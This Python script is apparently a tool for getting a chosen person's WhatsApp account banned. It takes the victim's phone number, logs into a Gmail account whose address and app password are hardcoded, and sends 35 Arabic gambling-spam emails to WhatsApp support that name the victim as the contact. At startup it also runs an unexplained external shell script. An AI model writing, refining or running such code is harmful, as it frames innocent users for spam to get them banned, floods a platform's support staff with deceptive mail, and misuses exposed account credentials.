import smtplib
from email.mime.text import MIMEText
import time
import os

os.system("bash whynfx.sh")
print ("WELCOME ANONYMOUS KILL YOUR TARGET !")
EMAIL = "dyrothmvp96@gmail.com"
PASSWORD = "wdix mqoo kvbf ebbb"
TO_EMAIL = "support@support.whatsapp.com"

# Minta nomor WA dari terminal
nomor = input("This is Banned Black Hat !(example: 62xxxxx): ")

SUBJECT = "-"
BODY = f"""مرحبًا بمطوري WhatsApp👋👋👋 أريد 
أوصي بمواقع المقامرة عبر الإنترنت 👻👻
الشيء المؤكد هو أنه جاكور 🎰🎰🤑🤑 شباب كتير 
تابع موقع المقامرة عبر الإنترنت الخاص بنا 😈😈 إذا كنت تريد متابعة موقع المقامرة عبر الإنترنت على WhatsApp 
يريد مارك زوكربيرج أو موظفو WhatsApp 
لمتابعة موقعنا يرجى زيارة الموقع 💋💋 أدناه 

https://bento.me/lendirxhut4d
https://bento.me/lendirxhut4d
https://bento.me/lendirxhut4d

أوه نعم 👍👍 لدينا 80.000 مشارك في المقامرة عبر الإنترنت و80% منهم أصبحوا مليارديرات🤑🤑 بفضل المقامرة عبر الإنترنت لدينا. إذا كنت عضوًا في WhatsApp أو مطور WhatsApp💻💻 وتريد الانضمام إلى هذا الموقع، فيرجى الاتصال بـ [الرئيس التنفيذي] لدينا.
تأكد من حصولك على 200,000,000.00 مليون 🤑🤑👻
يرجى الاتصال بالرقم أدناه

https://api.whatsapp.com/send?phone={nomor}"""

JUMLAH_KIRIM = 35
DELAY = 1

server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login(EMAIL, PASSWORD)

for i in range(JUMLAH_KIRIM):
    msg = MIMEText(BODY)
    msg['Subject'] = SUBJECT
    msg['From'] = EMAIL
    msg['To'] = TO_EMAIL
    
    server.send_message(msg)
    print(f"[{i+1}] Laporan terkirim untuk nomor {nomor}")
    time.sleep(DELAY)

server.quit()
print("banned successfully by BBH, estimate....")
